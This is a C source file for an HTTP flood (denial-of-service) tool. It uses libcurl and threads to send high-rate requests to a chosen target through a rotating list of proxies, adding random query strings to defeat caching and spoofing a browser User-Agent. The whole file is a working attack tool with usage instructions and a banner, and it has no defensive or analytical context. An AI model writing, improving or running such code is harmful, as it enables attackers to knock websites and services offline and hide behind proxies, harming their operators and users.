#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <curl/curl.h>
#include <time.h>
#include <signal.h>

#define MAX_PROXIES 10000
#define MAX_HEADERS 20
#define BLUE "\033[34m"
#define WHITE "\033[37m"
#define RESET "\033[0m"

typedef struct {
    char *host;
    int port;
} Proxy;

typedef struct {
    char *target;
    int time;
    int rate;
    int threads;
    char *proxyFile;
} Args;

Args args;
Proxy proxies[MAX_PROXIES];
int proxy_count = 0;
int running = 1;

char* randstr(int len) {
    char *str = malloc(len + 1);
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < len; i++) str[i] = charset[rand() % (sizeof(charset)-1)];
    str[len] = '\0';
    return str;
}

char* generate_random_string(int min, int max) {
    int len = min + rand() % (max - min + 1);
    return randstr(len);
}

void read_proxies(const char *file) {
    FILE *fp = fopen(file, "r");
    if (!fp) { perror("fopen"); exit(1); }
    char line[256];
    while (fgets(line, sizeof(line), fp) && proxy_count < MAX_PROXIES) {
        if (line[0] == '#' || line[0] == '\n') continue;
        line[strcspn(line, "\r\n")] = 0;
        char *ip = strtok(line, ":");
        char *port = strtok(NULL, ":");
        if (ip && port) {
            proxies[proxy_count].host = strdup(ip);
            proxies[proxy_count].port = atoi(port);
            proxy_count++;
        }
    }
    fclose(fp);
}

Proxy random_proxy() {
    return proxies[rand() % proxy_count];
}

void* flood_thread(void *arg) {
    CURL *curl;
    CURLcode res;
    struct curl_slist *headers = NULL;
    long thread_id = (long)arg;

    while (running) {
        Proxy proxy = random_proxy();
        curl = curl_easy_init();
        if (!curl) continue;

        char url[512];
        snprintf(url, sizeof(url), "%s?%s=%s", args.target, randstr(4), generate_random_string(8, 15));

        headers = curl_slist_append(headers, "Accept: */*");
        headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
        headers = curl_slist_append(headers, "Cache-Control: no-cache");
        char ua[128];
        snprintf(ua, sizeof(ua), "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36");
        headers = curl_slist_append(headers, ua);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_PROXY, proxy.host);
        curl_easy_setopt(curl, CURLOPT_PROXYPORT, proxy.port);
        curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 1L);
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
        curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 1L);

        for (int i = 0; i < args.rate; i++) {
            if (!running) break;
            res = curl_easy_perform(curl);
            if (res != CURLE_OK) break;
        }

        curl_slist_free_all(headers);
        headers = NULL;
        curl_easy_cleanup(curl);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 7) {
        printf("Usage: %s host time req thread proxy.txt\n", argv[0]);
        return 1;
    }

    srand(time(NULL));
    args.target = argv[1];
    args.time = atoi(argv[2]);
    args.rate = atoi(argv[3]);
    args.threads = atoi(argv[4]);
    args.proxyFile = argv[5];

    read_proxies(args.proxyFile);

    printf("%s--------------------------------------------%s\n", BLUE, RESET);
    printf("%sTarget: %s%s%s\n", WHITE, RESET, args.target, RESET);
    printf("%sRate: %s%d/s %s|%s %sThreads: %s%d%s\n", WHITE, RESET, args.rate, BLUE, RESET, WHITE, RESET, args.threads, RESET);
    printf("%sProxy: %s%s (%s%d%s)%s\n", WHITE, RESET, args.proxyFile, BLUE, RESET, proxy_count, RESET);
    printf("%s--------------------------------------------%s\n", BLUE, RESET);

    curl_global_init(CURL_GLOBAL_ALL);
    pthread_t threads[args.threads];

    for (long i = 0; i < args.threads; i++) {
        pthread_create(&threads[i], NULL, flood_thread, (void*)i);
    }

    sleep(args.time);
    running = 0;

    for (int i = 0; i < args.threads; i++) {
        pthread_join(threads[i], NULL);
    }

    curl_global_cleanup();
    for (int i = 0; i < proxy_count; i++) free(proxies[i].host);
    return 0;
}